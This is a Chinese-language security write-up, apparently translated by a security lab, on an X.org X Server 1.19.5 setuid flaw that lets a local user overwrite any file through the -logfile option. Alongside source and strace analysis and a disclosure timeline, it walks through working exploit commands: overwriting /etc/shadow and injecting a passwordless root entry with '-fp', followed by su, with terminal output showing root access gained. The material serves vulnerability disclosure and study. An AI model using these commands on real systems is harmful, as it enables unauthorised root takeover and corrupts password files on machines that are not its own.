原创： 合天网安实验室  合天智汇

  

### 任意文件覆盖导致的提权漏洞

  
  

 **由合天网安实验室翻译**  

#### 描述：

X.org X Server应用程序允许低权限的用户在系统的任何位置创建或覆盖文件，包括特色文件（如：/etc/shadow）。

攻击条件：拥有普通用户的控制台会话权限

#### 靶机：

  1. `CentOS-7`

  2. `[narendra@localhost ~]$ uname -a`

  3. `Linux localhost.localdomain 4.18.11-1.el7.elrepo.x86_64 #1 SMP Sat Sep 29 09:42:38 EDT 2018 x86_64 x86_64 xGNU/Linux`

X.Org X server 版本：1.19.5

#### 分析：

在CentOS和RedHat服务器操作系统上，X.org X Server 可执行文件（/usr/bin/Xorg）具有SETUID权限。

  1. `[Dev@localhost ~]$ ls -la /usr/bin/Xorg`

  2. `-rwsr-xr-x. 1 root root 2409344 Apr 11 22:12 /usr/bin/Xorg`

X.org X Server 应用程序中 LogInit()函数用来记录日志，X.org X Server 允许用户使用
“-logfile”选项指定日志文件。

如果系统上已存在与用户提供的"”同名的文件，则将其重命名为“.old”。完成此操作后，将使用用户提供的“”名称创建一个新文件，使用fopen()函数进行调用

Xorg-Server/os/log.c

  1. ` 244 const char * `

  2. ` 245 LogInit(const char *fname, const char *backup) `

  3. ` 246 { `

  4. ` 247 char *logFileName = NULL; `

  5. ` 248 `

  6. ` 249 if (fname && *fname) { `

  7. ` 250 if (displayfd != -1) { `

  8. ` 251 /* Display isn't set yet, so we can't use it in filenames yet. */ `

  9. ` 252 char pidstring[32]; `

  10. ` 253 snprintf(pidstring, sizeof(pidstring), "pid-%ld", `

  11. ` 254 (unsigned long) getpid()); `

  12. ` 255 logFileName = LogFilePrep(fname, backup, pidstring); `

  13. ` 256 saved_log_tempname = logFileName; `

  14. ` 257 `

  15. ` 258 /* Save the patterns for use when the display is named. */ `

  16. ` 259 saved_log_fname = strdup(fname); `

  17. ` 260 if (backup == NULL) `

  18. ` 261 saved_log_backup = NULL; `

  19. ` 262 else `

  20. ` 263 saved_log_backup = strdup(backup); `

  21. ` 264 } else `

  22. ` 265 logFileName = LogFilePrep(fname, backup, display); `

  23. ` 266 if ((logFile = fopen(logFileName, "w")) == NULL) `

  24. ` 267 FatalError("Cannot open log file \"%s\"\n", logFileName); `

  25. ` 268 setvbuf(logFile, NULL, _IONBF, 0); `

  26. ` 269 `

  27. ` 270 logFileFd = fileno(logFile); `

可以使用 **strace** 命令跟踪系统底层的 open() 调用过程

  1. `stat("mylogfile", 0x7ffcb9654ed0) &n-1 ENOENT (No such file or directory)`

  2. `open("mylogfile", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4`

  3. `rt_sigaction(SIGALRM, {0x55b6e2c2ca70, [ALRM], SA_RESTORER|SA_RESTART, 0x7fb0353036d0}, NULL, 8) = 0`

从跟踪日志可以看出， **O_EXCL** 标志没有设置，所以fopen() 函数会创建或者覆盖已有的文件。

#### 漏洞利用：

主要利用以下3点：

1、fopen()调用的输入是用户可控的文件名

2、fopen()将创建或覆盖已存在的文件

3、可执行文件/usr/bin/Xorg具有setuid权限

 **/etc/shadow 文件覆盖测试**

  1. ` [Dev@localhost ~]$ uname -r`

  2. ` 3.10.0-862.el7.x86_64`

  3. ` [Dev@localhost ~]$ Xorg -version`

  4. ` X.Org X Server 1.19.5`

  5. ` Release Date: 2017-10-12`

  6. ` X Protocol Version 11, Revision 0`

  7. ` Build Operating System: 2.6.32-696.18.7.el6.x86_64`

  8. ` Current Operating System: Linux localhost.localdomain 3.10.0-862.el7.x86_64 #1 SMP Wed Mar 21 18:14:51 EDT 2018 x86_64`

  9. ` Kernel command line: BOOT_IMAGE=/vmlinuz-3.10.0-862.el7.x86_64 root=/dev/mapper/rhel-root ro crashkernel=auto rd.lvm.lv=rhel/root rd.lvm.lv=rhel/swap rhgb quiet LANG=en_US.UTF-8`

  10. ` Build Date: 13 February 2018 02:39:52PM`

  11. ` Build ID: xorg-x11-server 1.19.5-5.el7`

  12. ` Current version of pixman: 0.34.0`

  13. ` Before reporting problems, check http://wiki.x.org to make sure that you have the latest version.`

  14. ` [Dev@localhost ~]`

  15. ` [Dev@localhost ~]$ id`

  16. ` uid=1000(Dev) gid=1000(Dev) groups=1000(Dev) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023`

  17. ` [Dev@localhost ~]$`

  18. ` [Dev@localhost ~]$ cd /etc`

  19. ` [Dev@localhost etc]$ ls -la shadow`

  20. ` ----------. 1 root root 1650 Oct 6 05:03 shadow`

  21. ` [Dev@localhost etc]$`

  22. ` [Dev@localhost etc]$ cat shadow`

  23. ` cat: shadow: Permission denied`

  24. ` [Dev@localhost etc]$`

  25. ` [Dev@localhost etc]$ Xorg -logfile shadow :1 #指定日志文件为shadow`

  26. ` X.Org X Server 1.19.5`

  27. ` Release Date: 2017-10-12`

  28. ` X Protocol Version 11, Revision 0`

  29. ` Build Operating System: 2.6.32-696.18.7.el6.x86_64`

  30. ` Current Operating System: Linux localhost.localdomain 3.10.0-862.el7.x86_64 #1 SMP Wed Mar 21 18:14:51 EDT 2018 x86_64`

  31. ` Kernel command line: BOOT_IMAGE=/vmlinuz-3.10.0-862.el7.x86_64 root=/dev/mapper/rhel-root ro crashkernel=auto rd.lvm.lv=rhel/root rd.lvm.lv=rhel/swap rhgb quiet LANG=en_US.UTF-8`

  32. ` Build Date: 13 February 2018 02:39:52PM`

  33. ` Build ID: xorg-x11-server 1.19.5-5.el7`

  34. ` Current version of pixman: 0.34.0`

  35. ` Before reporting problems, check http://wiki.x.org to make sure that you have the latest version.`

  36. ` Markers: (--) probed, (**) from config file, (==) default setting,`

  37. ` (++) from command line, (!!) notice, (II) informational,`

  38. ` (WW) warning, (EE) error, (NI) not implemented, (??) unknown.`

  39. ` (++) Log file: "shadow", Time: Sat Oct 6 21:54:13 2018`

  40. ` (==) Using config directory: "/etc/X11/xorg.conf.d"`

  41. ` (==) Using system config directory "/usr/share/X11/xorg.conf.d"`

  42. ` ^Cerror setting MTRR (base = 0x00000000e0000000, size = 0x01700000, type = 1) Invalid argument (22)`

  43. ` (II) Server terminated successfully (0). Closing log file.`

  44. ` [Dev@localhost etc]$`

  45. ` [Dev@localhost etc]$`

  46. ` [Dev@localhost etc]$ ls -la shadow`

  47. ` -rw-r--r--. 1 root Dev 53901 Oct 6 21:54 shadow`

  48. ` [Dev@localhost etc]$`

  49. ` [Dev@localhost etc]$ head shadow #写入成功`

  50. ` [ 11941.870]`

  51. ` X.Org X Server 1.19.5`

  52. ` Release Date: 2017-10-12`

  53. ` [ 11941.870] X Protocol Version 11, Revision 0`

  54. ` [ 11941.870] Build Operating System: 2.6.32-696.18.7.el6.x86_64`

  55. ` [ 11941.870] Current Operating System: Linux localhost.localdomain 3.10.0-862.el7.x86_64 #1 SMP Wed Mar 21 18:14:51 EDT 2018 x86_64`

  56. ` [ 11941.870] Kernel command line: BOOT_IMAGE=/vmlinuz-3.10.0-862.el7.x86_64 root=/dev/mapper/rhel-root ro crashkernel=auto rd.lvm.lv=rhel/root rd.lvm.lv=rhel/swap rhgb quiet LANG=en_US.UTF-8`

  57. ` [ 11941.870] Build Date: 13 February 2018 02:39:52PM`

  58. ` [ 11941.870] Build ID: xorg-x11-server 1.19.5-5.el7`

  59. ` [ 11941.870] Current version of pixman: 0.34.0`

  60. ` [Dev@localhost etc]$`

权限提升

  1. ` [Dev@localhost ~]$ id #当前权限`

  2. ` uid=1000(Dev) gid=1000(Dev) groups=1000(Dev) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023`

  3. ` [Dev@localhost ~]$`

  4. ` [Dev@localhost ~]$ cd /etc`

  5. ` [Dev@localhost etc]$`

  6. ` [Dev@localhost etc]$ ls -la shadow`

  7. ` ----------. 1 root root 1241 Oct 10 01:15 shadow`

  8. ` [Dev@localhost etc]$`

  9. ` [Dev@localhost etc]$ cat shadow #查看权限`

  10. ` cat: shadow: Permission denied`

  11. ` [Dev@localhost etc]$`

  12. ` [Dev@localhost etc]$ Xorg -fp "root::16431:0:99999:7:::" -logfile shadow :1 #写入文件，root无密码`

  13. ` X.Org X Server 1.19.5`

  14. ` Release Date: 2017-10-12`

  15. ` X Protocol Version 11, Revision 0`

  16. ` Build Operating System: 3.10.0-693.17.1.el7.x86_64`

  17. ` Current Operating System: Linux localhost.localdomain 3.10.0-862.14.4.el7.x86_64 #1 SMP Wed Sep 26 15:12:11 UTC 2018 x86_64`

  18. ` Kernel command line: BOOT_IMAGE=/vmlinuz-3.10.0-862.14.4.el7.x86_64 root=/dev/mapper/centos-root ro crashkernel=auto rd.lvm.lv=centos/root rd.lvm.lv=centos/swap rhgb quiet LANG=en_US.UTF-8`

  19. ` Build Date: 11 April 2018 04:40:54PM`

  20. ` Build ID: xorg-x11-server 1.19.5-5.el7`

  21. ` Current version of pixman: 0.34.0`

  22. ` Before reporting problems, check http://wiki.x.org`

  23. ` to make sure that you have the latest version.`

  24. ` Markers: (--) probed, (**) from config file, (==) default setting,`

  25. ` (++) from command line, (!!) notice, (II) informational,`

  26. ` (WW) warning, (EE) error, (NI) not implemented, (??) unknown.`

  27. ` (++) Log file: "shadow", Time: Wed Oct 10 01:16:10 2018`

  28. ` (==) Using config directory: "/etc/X11/xorg.conf.d"`

  29. ` (==) Using system config directory "/usr/share/X11/xorg.conf.d"`

  30. ` ^Cerror setting MTRR (base = 0x00000000e0000000, size = 0x01700000, type = 1) Invalid argument (22)`

  31. ` (II) Server terminated successfully (0). Closing log file.`

  32. ` [Dev@localhost etc]$ ls -la shadow`

  33. ` -rw-r--r--. 1 root Dev 53897 Oct 10 01:16 shadow`

  34. ` [Dev@localhost etc]$`

  35. ` [Dev@localhost etc]$ cat shadow | grep "root::" #写入文件成功`

  36. ` root::16431:0:99999:7:::`

  37. ` [Dev@localhost etc]$`

  38. ` [Dev@localhost etc]$`

  39. ` [Dev@localhost etc]$ su #切换到root用户`

  40. ` [root@localhost etc]#`

  41. ` [root@localhost etc]# id #查看权限，提权成功`

  42. ` uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023`

#### 修复信息：

https://lists.x.org/archives/xorg-announce/2018-October/002927.htmlhttps://lists.x.org/archives/xorg-announce/2018-October/002928.html

#### 时间线:

2018-10-10: 联系 secalert@redhat.com

2018-10-12: 联系 X.org 团队

2018-10-25: 协调发布时间 (Time: 14:00 UTC)

  

